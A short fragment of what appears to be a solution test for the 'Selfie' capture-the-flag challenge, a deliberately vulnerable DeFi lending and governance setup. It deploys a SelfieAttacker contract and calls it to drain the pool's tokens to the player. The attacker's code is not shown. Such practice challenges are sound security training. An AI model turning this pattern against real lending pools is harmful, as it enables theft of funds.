...
describe("[Challenge] Selfie", function () {
  ...
  it("Execution", async function () {
    ...
    const Attack = await ethers.getContractFactory("SelfieAttacker");
    const attack = await Attack.deploy(governance.address, pool.address);
    await attack.deployed();
    console.log("Attacker deployed to:", attack.address);
    await attack.attack(player.address, TOKENS_IN_POOL);
